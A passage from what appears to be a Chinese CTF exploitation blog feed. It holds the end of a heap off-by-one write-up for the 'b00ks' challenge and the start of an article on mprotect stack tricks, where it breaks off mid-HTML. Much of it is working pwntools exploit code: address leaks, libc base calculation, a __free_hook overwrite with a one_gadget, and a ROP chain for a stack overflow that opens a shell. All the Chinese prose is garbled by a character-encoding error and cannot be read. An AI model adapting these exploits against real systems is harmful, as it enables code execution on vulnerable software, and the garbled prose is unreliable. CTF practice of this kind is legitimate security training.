20250306202108"><br>ç”±äºä½œè€…åå’Œbook1ç»“æ„ä½“ç›¸è¿ï¼Œæ‰€ä»¥äº‹å®ä¸Šbook1ç»“æ„ä½“æŒ‡é’ˆçš„ä½ä½30å°†åŸæœ‰ä½œè€…åæº¢å‡ºçš„\x00è¦†ç›–æ‰äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å¦‚æœæ‰“å°ä½œè€…åï¼Œæœ€åçš„\x00ä¹Ÿæ˜¯è¦è¾“å‡ºçš„ï¼Œä½†æ˜¯è¢«e0è¦†ç›–ä¹‹åe0ä¹Ÿä¼šè¢«æ‰“å°ï¼Œç”±äºe0æ˜¯book1ç»“æ„ä½“æŒ‡é’ˆçš„èµ·å§‹ä½ç½®ï¼Œé‚£ä¹ˆbook1ç»“æ„ä½“æŒ‡é’ˆä¹Ÿä¼šè¢«ä¸€èµ·æ‰“å°å‡ºæ¥ã€‚<br>ä¸¾ä¸ªæ —å­ï¼šä¸¤å¼ æ‰‘å…‹ç‰ŒAã€Bï¼Œç‰ŒAæ”¾åœ¨æ¡Œå­ä¸Šï¼Œç‰ŒBçš„è¾¹ç¼˜æ¶‚ä¸Šèƒ¶æ°´ï¼Œæ¥ç€å°†ç‰ŒBæœ‰èƒ¶æ°´çš„ä¸€é¢è¾¹ç¼˜æ”¾åœ¨ç‰ŒAçš„è¾¹ç¼˜ä½¿ä¸¤å¼ ç‰Œé»åœ¨ä¸€èµ·ï¼Œæœ€åä»æ¡Œå­ä¸Šæ‹¿èµ·ç‰ŒAï¼Œç”±äºAä¸Bç²˜åˆçš„åŸå› ï¼Œç‰ŒBä¹Ÿä¼šè·Ÿç€è¢«ä»æ¡Œå­ä¸Šæ‹¿èµ·</p><p>book1çš„ç»“æ„ä½“æŒ‡é’ˆ:<code>0x0000555555a02130</code><br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306204104.png" alt="Pasted image 20250306204104"></p><p>æ—¢ç„¶book1çš„ç»“æ„ä½“æŒ‡é’ˆä½ä½èƒ½å¤Ÿè¦†ç›–ä½œè€…åçš„\x00ï¼Œé‚£ä¹ˆä½œè€…åçš„\x00æ˜¯ä¸æ˜¯ä¹Ÿèƒ½å¤Ÿè¦†ç›–ç»“æ„ä½“æŒ‡é’ˆçš„ä½ä½å‘¢ï¼Ÿæ­£å¥½è¿™ä¸ªç¨‹åºè¿˜æœ‰ä¿®æ”¹ä½œè€…åçš„åŠŸèƒ½ï¼Œè€Œä¸”åœ¨å‰é¢idaåˆ†æçš„æ—¶å€™å‘ç°æ–°çš„ä½œè€…åä¾ç„¶è¿˜ä¼šå­˜æ”¾åœ¨202018çš„ä½ç½®ã€‚é‚£ä¹ˆæˆ‘ä»¬é¢„æƒ³ä¸€ä¸‹book1çš„ç»“æ„ä½“æŒ‡é’ˆæ˜¯0x0000555555a020e0é‚£ä¹ˆè¢«è¦†ç›–ä¹‹åå°±ä¼šå˜æˆ0x0000555555a02000</p><p><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306205146.png" alt="Pasted image 20250306205146"><br>å¯ä»¥çœ‹åˆ°book1åŸæœ‰çš„ç»“æ„ä½“æŒ‡é’ˆ0x0000555555a020e0è¢«\x00è¦†ç›–æˆäº†0x0000555555a02000ï¼Œç°åœ¨æ‹¿å‡ºä½ çš„è®°äº‹æœ¬ï¼Œ0x0000555555a020b0çš„ä½ç½®å°±æ˜¯åˆšæ‰book1_descçš„ä½ç½®ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¦å°†book1_nameè®¾ç½®æˆ128çš„åŸå› ã€‚é‚£ä¹ˆæˆ‘ä»¬å»æƒ³æƒ³ä¸€æƒ³ï¼Œè°ƒç”¨ä¸€æœ¬ä¹¦çš„æµç¨‹ï¼šé¦–å…ˆæ˜¯å’Œå›¾ä¹¦idå¯¹åº”ç€å›¾ä¹¦çš„ç»“æ„ä½“æŒ‡é’ˆï¼Œç»“æ„ä½“æŒ‡é’ˆå¯¹åº”ç€ç»“æ„ä½“ï¼Œç»“æ„ä½“å¸¦åŠ¨å…¶ä¸­çš„æˆå‘˜å˜é‡ã€‚é‚£ä¹ˆä¸Šå›¾æˆ‘ä»¬é€šè¿‡\x00è¦†ç›–ä¹‹ååŸæœ‰çš„ç»“æ„ä½“æŒ‡é’ˆå˜æˆäº†0x0000555555a020b0ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šå»0x0000555555a020b0çš„ä½ç½®å¯»æ‰¾ç»“æ„ä½“ã€‚å¦‚æœæˆ‘ä»¬åœ¨åŸæœ‰çš„book1çš„book1_descçš„ä½ç½®ä¼ªé€ ä¸€ä¸ªç»“æ„ä½“ï¼Œç„¶ååœ¨è¿›è¡Œ\xb0è¦†ç›–ï¼Œé‚£ä¹ˆå°±æŠŠä¼ªé€ çš„ç»“æ„ä½“å½“åšbook1æ¥å®ç°ï¼š</p><p><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306211151.png" alt="Pasted image 20250306211151"></p><p>book1=0x0000555555a02130<br><img src="/2025/03/09/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/Pasted image 20250306211606.png" alt="Pasted image 20250306211606"></p><ul><li>book2_name-book1_addr=0x555555a02168-0x0000555555a02130=0x38</li><li>book2_desc - book1_addr = 0x0000555555a02170 - 0x0000555555a02130 = 0x40 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p64(1) + p64(book1_addr + 0x38) + p64(book1_addr + 0x40) + p64(0xffff)</span><br></pre></td></tr></table></figure>æˆ‘ä»¬éƒ¨ç½²å¥½ç»“æ„ä½“ä¹‹åè¿˜éœ€è¦é‡æ–°ä¿®æ”¹ä¸€ä¸‹ä½œè€…åï¼Œå› ä¸ºæˆ‘ä»¬çš„ç»“æ„ä½“æ˜¯å†™åœ¨åŸbook1_descä¸­çš„ï¼Œæ‰€ä»¥æŒ‰ç…§æ”»å‡»æµç¨‹ä¸Šæ¥è¯´åº”è¯¥å…ˆéƒ¨ç½²ä¼ªé€ çš„ç»“æ„ä½“ï¼Œç„¶åå†ä½¿ç”¨<code>\x00</code>è¦†ç›–book1ç»“æ„ä½“æŒ‡é’ˆï¼Œä½¿æŒ‡é’ˆæŒ‡å‘æˆ‘ä»¬ä¼ªé€ çš„ç»“æ„ä½“</li></ul><p>è¿™æ ·ä¸€æ¥æˆ‘ä»¬æŒ‰<code>c</code>å›åˆ°ç¨‹åºæ‰§è¡Œæµç¨‹ï¼Œå…ˆä¿®æ”¹ä½œè€…åï¼Œç„¶åå†æ¬¡æ‰§è¡Œæ‰“å°åŠŸèƒ½ï¼Œå°±ä¼šå°†book2_nameå’Œbook2_descæ‰“å°å‡ºæ¥äº†ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">book1_addr = <span class="number">0x555555757730</span></span><br><span class="line">payload = p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">editbook(book_id_1, payload)</span><br><span class="line">changename(<span class="string">&quot;hollkaaabbbbbbbbccccccccdddddddd&quot;</span>)</span><br><span class="line">book_id_1, book_name, book_des, book_author = printbook(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;info&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&#x27;./b00ks&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/zechariah/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_book</span>(<span class="params">name_size, name, des_size, des</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name size: &#x27;</span>, <span class="built_in">str</span>(name_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;chars): &#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;description size: &#x27;</span>, <span class="built_in">str</span>(des_size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>, des)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_book</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;delete: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_book</span>(<span class="params"><span class="built_in">id</span>,new_des</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;edit: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>, new_des)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_book</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">id</span>):</span><br><span class="line">        book_id=<span class="built_in">int</span>(p.recvline()[:-<span class="number">1</span>])</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        book_name=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        book_des=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        book_author=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> book_id,book_name,book_des,book_author</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_author</span>(<span class="params">author_name</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name: &#x27;</span>,author_name)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createname</span>(<span class="params">name</span>):</span><br><span class="line">        p.readuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">        p.sendline(name)</span><br><span class="line"></span><br><span class="line">createname(<span class="string">&quot;hollkaaabbbbbbbbccccccccdddddddd&quot;</span>)</span><br><span class="line">create_book(<span class="number">208</span>,<span class="string">&#x27;Zechariah&#x27;</span>,<span class="number">32</span>,<span class="string">&#x27;Zechariah_des1&#x27;</span>)//æ ¹æ®å®é™…è®¡ç®—</span><br><span class="line">create_book(<span class="number">0x21000</span>,<span class="string">&#x27;Zechariah&#x27;</span>,<span class="number">0x21000</span>,<span class="string">&#x27;Zechariah_des2&#x27;</span>)</span><br><span class="line">book_id,book_name,book_des,book_author=print_book(<span class="number">1</span>)</span><br><span class="line">book1_addr=u64(book_author[<span class="number">32</span>:<span class="number">32</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;book1_addr: &quot;</span>+<span class="built_in">hex</span>(book1_addr))</span><br><span class="line">payload = p64(<span class="number">1</span>) + p64(book1_addr + <span class="number">0x38</span>) + p64(book1_addr + <span class="number">0x40</span>) + p64(<span class="number">0xffff</span>)</span><br><span class="line">edit_book(<span class="number">1</span>, payload)</span><br><span class="line">change_author(<span class="string">&quot;hollkaaabbbbbbbbccccccccdddddddd&quot;</span>)</span><br><span class="line">book_id, book_name, book_des, book_author = print_book(<span class="number">1</span>)</span><br><span class="line">book2_name_addr = u64(book_name.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">book2_des_addr = u64(book_des.ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">success(<span class="string">&quot;book2_name_addr: &quot;</span>+<span class="built_in">hex</span>(book2_name_addr))</span><br><span class="line"><span class="comment">#0x7ffff7fd2010-0x7ffff7800000</span></span><br><span class="line">libc_base = book2_name_addr - (<span class="number">0x7ffff7fd2010</span>-<span class="number">0x7ffff7800000</span>)</span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">one_gadget = libc_base+<span class="number">0x4525a</span> <span class="comment">#0x4525a 0xef9f4 0xf0897</span></span><br><span class="line">log.success(<span class="string">&quot;free_hook:&quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line">log.success(<span class="string">&quot;one_gadget:&quot;</span> + <span class="built_in">hex</span>(one_gadget))</span><br><span class="line">edit_book(<span class="number">1</span>, p64(free_hook))</span><br><span class="line">edit_book(<span class="number">2</span>, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">delete_book(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNæŠ€å·§-mprotectä¿®æ”¹å†…å­˜ä¿æŠ¤æƒé™</title>
      <link href="/2025/03/03/PWN%E6%8A%80%E5%B7%A7-mprotect%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E4%BF%9D%E6%8A%A4%E6%9D%83%E9%99%90/"/>
      <url>/2025/03/03/PWN%E6%8A%80%E5%B7%A7-mprotect%E4%BF%AE%E6%94%B9%E5%86%85%E5%AD%98%E4%BF%9D%E6%8A%A4%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<p>mprotect å‡½æ•°ç”¨äºè®¾ç½®ä¸€å—å†…å­˜çš„ä¿æŠ¤æƒé™ï¼ˆå°†ä» start å¼€å§‹ã€é•¿åº¦ä¸º len çš„å†…å­˜çš„ä¿æŠ¤å±æ€§ä¿®æ”¹ä¸º prot æŒ‡å®šçš„å€¼ï¼‰ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹æ‰€ç¤ºï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mprotect</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len, <span class="type">int</span> prot)</span>;</span><br></pre></td></tr></table></figure></p><ul><li>prot çš„å–å€¼å¦‚ä¸‹ï¼Œé€šè¿‡ <code>|</code> å¯ä»¥å°†å‡ ä¸ªå±æ€§ç»“åˆä½¿ç”¨ï¼ˆå€¼ç›¸åŠ ï¼‰ï¼š<ul><li><code>PROT_READ</code>ï¼šå¯å†™ï¼Œå€¼ä¸º 1</li><li><code>PROT_WRITE</code>ï¼šå¯è¯»ï¼Œ å€¼ä¸º 2</li><li><code>PROT_EXEC</code>ï¼šå¯æ‰§è¡Œï¼Œå€¼ä¸º 4</li><li><code>PROT_NONE</code>ï¼šä¸å…è®¸è®¿é—®ï¼Œå€¼ä¸º 0</li></ul></li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒæŒ‡å®šçš„å†…å­˜åŒºé—´å¿…é¡»åŒ…å«æ•´ä¸ªå†…å­˜é¡µï¼ˆ4Kï¼‰ï¼Œèµ·å§‹åœ°å€ start å¿…é¡»æ˜¯ä¸€ä¸ªå†…å­˜é¡µçš„èµ·å§‹åœ°å€ï¼Œå¹¶ä¸”åŒºé—´é•¿åº¦ len å¿…é¡»æ˜¯é¡µå¤§å°çš„æ•´æ•°å€ã€‚</p><p>å¦‚æœæ‰§è¡ŒæˆåŠŸï¼Œå‡½æ•°è¿”å› 0ï¼›å¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œå‡½æ•°è¿”å› -1ï¼Œå¹¶ä¸”é€šè¿‡ errno å˜é‡è¡¨ç¤ºå…·ä½“åŸå› ã€‚é”™è¯¯çš„åŸå› ä¸»è¦æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š</p><ul><li><code>EACCES</code>ï¼šè¯¥å†…å­˜ä¸èƒ½è®¾ç½®ä¸ºç›¸åº”æƒé™ã€‚è¿™æ˜¯å¯èƒ½å‘ç”Ÿçš„ï¼Œæ¯”å¦‚ mmap(2) æ˜ å°„ä¸€ä¸ªæ–‡ä»¶ä¸ºåªè¯»çš„ï¼Œæ¥ç€ä½¿ç”¨ mprotect() ä¿®æ”¹ä¸º PROT_WRITEã€‚</li><li><code>EINVAL</code>ï¼šstart ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆæŒ‡é’ˆï¼ŒæŒ‡å‘çš„ä¸æ˜¯æŸä¸ªå†…å­˜é¡µçš„å¼€å¤´ã€‚</li><li><code>ENOMEM</code>ï¼šå†…æ ¸å†…éƒ¨çš„ç»“æ„ä½“æ— æ³•åˆ†é…ã€‚</li><li><code>ENOMEM</code>ï¼šè¿›ç¨‹çš„åœ°å€ç©ºé—´åœ¨åŒºé—´ [start, start+len] èŒƒå›´å†…æ˜¯æ— æ•ˆï¼Œæˆ–è€…æœ‰ä¸€ä¸ªæˆ–å¤šä¸ªå†…å­˜é¡µæ²¡æœ‰æ˜ å°„ã€‚</li></ul><p>å½“ä¸€ä¸ªè¿›ç¨‹çš„å†…å­˜è®¿é—®è¡Œä¸ºè¿èƒŒäº†å†…å­˜çš„ä¿æŠ¤å±æ€§ï¼Œå†…æ ¸å°†å‘å‡º SIGSEGVï¼ˆSegmentation faultï¼Œæ®µé”™è¯¯ï¼‰ä¿¡å·ï¼Œå¹¶ä¸”ç»ˆæ­¢è¯¥è¿›ç¨‹ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>ä¾‹é¢˜æ¥è‡ª 2020 å®‰ç½‘æ¯ï¼Œpwn1 æ˜¯ç›¸å¯¹ç®€å•å¯¹æ ˆæº¢å‡ºï¼Œpwn2 åœ¨æ­¤åŸºç¡€ä¸Šå¢åŠ äº† mprotect çš„è¿ç”¨ï¼ŒåŒæ—¶è¿˜æ˜¯ä¸€ä¸ªé™æ€ç¼–è¯‘çš„ç¨‹åºã€‚<br>å…ˆæ¥çœ‹ pwn1ï¼Œè¿™æ˜¯ä¸€ä¸ª 64 ä½çš„åŠ¨æ€é“¾æ¥ç¨‹åºï¼Œå¼€å¯äº† Partial RELRO å’Œ NXã€‚ç³»ç»Ÿå±‚é¢ ASLR ä¹Ÿæ˜¯å¼€å¯çš„ã€‚<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file pwn1 </span><br><span class="line">pwn1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=f92248c7cd330ab53768c281b50d14b4612259f4, not stripped</span><br><span class="line">$ pwn checksec pwn1</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p><p>ä¸»å‡½æ•° main() å…ˆè°ƒç”¨ write() æ‰“å°å­—ç¬¦ä¸²ï¼Œç„¶åè¿›å…¥å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´çš„ vul() å‡½æ•°ï¼Œ<code>read(0, &amp;buf, 0x100uLL)</code> è¯»å…¥æœ€å¤š 0x100 å­—èŠ‚åˆ° 0x80 å¤§å°çš„ç¼“å†²åŒºã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.text:0000000000400587 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:0000000000400587 public main</span><br><span class="line">.text:0000000000400587 main proc near</span><br><span class="line">.text:0000000000400587 ; __unwind &#123;</span><br><span class="line">.text:0000000000400587 push    rbp</span><br><span class="line">.text:0000000000400588 mov     rbp, rsp</span><br><span class="line">.text:000000000040058B mov     edx, 9          ; n</span><br><span class="line">.text:0000000000400590 mov     esi, offset aWelcome ; <span class="string">&quot;welcome~\n&quot;</span></span><br><span class="line">.text:0000000000400595 mov     edi, 1          ; fd</span><br><span class="line">.text:000000000040059A call    _write</span><br><span class="line">.text:000000000040059F call    vul</span><br><span class="line">.text:00000000004005A4 mov     eax, 0</span><br><span class="line">.text:00000000004005A9 pop     rbp</span><br><span class="line">.text:00000000004005AA retn</span><br><span class="line">.text:00000000004005AA ; &#125; // starts at 400587</span><br><span class="line">.text:00000000004005AA main endp</span><br><span class="line"></span><br><span class="line">.text:0000000000400566 public vul</span><br><span class="line">.text:0000000000400566 vul proc near</span><br><span class="line">.text:0000000000400566</span><br><span class="line">.text:0000000000400566 buf= byte ptr -80h</span><br><span class="line">.text:0000000000400566</span><br><span class="line">.text:0000000000400566 ; __unwind &#123;</span><br><span class="line">.text:0000000000400566 push    rbp</span><br><span class="line">.text:0000000000400567 mov     rbp, rsp</span><br><span class="line">.text:000000000040056A add     rsp, 0FFFFFFFFFFFFFF80h</span><br><span class="line">.text:000000000040056E lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000400572 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:0000000000400577 mov     rsi, rax        ; buf</span><br><span class="line">.text:000000000040057A mov     edi, 0          ; fd</span><br><span class="line">.text:000000000040057F call    _read</span><br><span class="line">.text:0000000000400584 nop</span><br><span class="line">.text:0000000000400585 leave</span><br><span class="line">.text:0000000000400586 retn</span><br><span class="line">.text:0000000000400586 ; &#125; // starts at 400566</span><br><span class="line">.text:0000000000400586 vul endp</span><br></pre></td></tr></table></figure><p>æ€»ä½“æ€è·¯å°±æ˜¯æ ˆæº¢å‡ºæ§åˆ¶è¿”å›åœ°å€ï¼Œæ‰§è¡Œ one-gadgetã€‚å› æ­¤ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ³„æ¼ libc åœ°å€ï¼Œç¨‹åºé‡Œæœ‰ write() å‡½æ•°å¯ä»¥åˆ©ç”¨ã€‚exp å¦‚ä¸‹æ‰€ç¤ºï¼š<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400611</span></span><br><span class="line">pop_rdi = <span class="number">0x400613</span></span><br><span class="line">write = <span class="number">0x400595</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x88</span> + p64(pop_rsi_r15) + p64(elf.got[<span class="string">&#x27;write&#x27;</span>])*<span class="number">2</span> + p64(write)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;welcome~\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">one_gadget = write_addr - libc.sym[<span class="string">&#x27;write&#x27;</span>] + <span class="number">0x4527a</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x88</span> + p64(one_gadget)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p><blockquote><p>ç»æµ‹è¯•ï¼Œone-gadgetåœ¨æœ¬é¢˜ä¸­å¹¶ä¸é€šç”¨ï¼Œå»ºè®®è‡ªè¡Œæ„é€ ROPé“¾</p></blockquote><p>pwn2 æ˜¯ä¸€ä¸ª 64 ä½çš„é™æ€é“¾æ¥ç¨‹åºï¼Œå¼€å¯äº† Partial RELRO å’Œ NXã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ file pwn2 </span><br><span class="line">pwn2: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=a3abf349ced6dccd645f0a95d9d47e8ac1217e3e, not stripped</span><br><span class="line">$ pwn checksec pwn2 </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>ç”±äºé™æ€é“¾æ¥ç¨‹åºçš„æ‰§è¡Œä¸å†éœ€è¦ libcï¼Œå› æ­¤ ret2libc ç±»å‹çš„æ”»å‡»æ‰‹æ®µå°±å¤±æ•ˆäº†ï¼Œéœ€è¦è€ƒè™‘æ³¨å…¥ shellcodeï¼Œä½†æ˜¯åˆå¼€å¯äº† NX ä¿æŠ¤ï¼Œè¿™æ—¶å°±éœ€è¦ä½¿ç”¨æœ¬èŠ‚æ‰€è®²çš„ mprotect() å‡½æ•°ä¿®æ”¹æ ˆçš„å¯æ‰§è¡Œæƒé™ã€‚</p><p>å¯ä»¥åœ¨ç¨‹åºé‡Œæ‰¾åˆ°å…³é”®å‡½æ•° _dl_make_stack_executable()ï¼Œè¯¥å‡½æ•°å†…éƒ¨è°ƒç”¨äº† <code>mprotect(v3, dl_pagesize, (unsigned int)_stack_prot)</code>ï¼š</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -s pwn2 | grep <span class="built_in">exec</span></span><br><span class="line">   635: 0000000000499f70  2296 FUNC    LOCAL  DEFAULT    6 execute_cfa_program</span><br><span class="line">   639: 000000000049af40  2094 FUNC    LOCAL  DEFAULT    6 execute_stack_op</span><br><span class="line">   821: 0000000000474730    92 FUNC    GLOBAL DEFAULT    6 _dl_make_stack_executable</span><br><span class="line">  1831: 00000000006cb168     8 OBJECT  GLOBAL DEFAULT   25 _dl_make_stack_executable</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unsigned int __fastcall dl_make_stack_executable(_QWORD *a1)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; // rdx</span><br><span class="line">  _QWORD *v2; // rax</span><br><span class="line">  signed __int64 v3; // rdi</span><br><span class="line">  _QWORD *v4; // rbx</span><br><span class="line">  unsigned int result; // eax</span><br><span class="line"></span><br><span class="line">  v1 = *a1;</span><br><span class="line">  v2 = a1;</span><br><span class="line">  v3 = *a1 &amp; -(signed __int64)dl_pagesize;</span><br><span class="line">  <span class="keyword">if</span> ( v1 != _libc_stack_end )</span><br><span class="line">    <span class="built_in">return</span> 1;</span><br><span class="line">  v4 = v2;</span><br><span class="line">  result = mprotect(v3, dl_pagesize, (unsigned int)_stack_prot);</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">return</span> __readfsdword(0xFFFFFFD0);</span><br><span class="line">  *v4 = 0LL;</span><br><span class="line">  dl_stack_flags |= 1u;</span><br><span class="line">  <span class="built_in">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ æ–¹æ³•æ˜¯åœ¨è¿›å…¥ _dl_make_stack_executable å‡½æ•°ä¹‹å‰ï¼Œå°†å…¨å±€å˜é‡ _stack_prot è®¾ç½®ä¸º 7ï¼ˆå¯è¯»å¯å†™å¯æ‰§è¡Œï¼‰ï¼ŒåŒæ—¶å°† rdi è®¾ç½®ä¸ºå…¨å±€å˜é‡ __libc_stack_end çš„å€¼ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gefâ¤  x/gx $rsp-<span class="number">0x10</span></span><br><span class="line"><span class="number">0x7ffef00bbb08</span>:<span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x7ffef00bbb10</span>:<span class="number">0x4141414141414141</span></span><br><span class="line"><span class="number">0x7ffef00bbb18</span>:<span class="number">0x00000000004015e7</span>  <span class="comment"># pop rsi ; ret</span></span><br><span class="line"><span class="number">0x7ffef00bbb20</span>:<span 